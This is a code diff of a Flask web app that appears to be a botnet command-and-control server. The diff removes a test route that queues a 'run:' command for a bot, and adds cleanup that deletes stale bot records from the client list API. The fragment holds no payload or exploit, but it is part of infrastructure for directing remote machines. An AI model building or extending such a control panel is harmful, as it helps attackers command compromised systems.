@@ -30,21 +30,18 @@ def kill():
     app.killswitch = 1
     abort(500)
 
-@app.route('/testcmd')
-@login_required
-def testcmd():
-    g.queue['127.0.0.1'].append("run:okay dad")
-    b = Bot.query.filter_by(ip="127.0.0.1").one()
-    return str(b.last_seen)
-
 @app.route("/api/clients/list", methods=["GET"])
 @login_required
 def api_clients_list():
     bots = Bot.query.all()
-    #bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
     data = {}
     for bot in bots:
-        if not bot.ip in g.queue.keys():
+        if bot.last_command is None and bot.os is None:
+            if bot.last_seen > 10000:
+                db.session.delete(bot)
+                db.session.commit()
+            continue
+        if bot.ip not in g.queue.keys():
             g.queue[bot.ip] = list()
         data[bot.id] = dict()
         data[bot.id]["IP"] = bot.ip
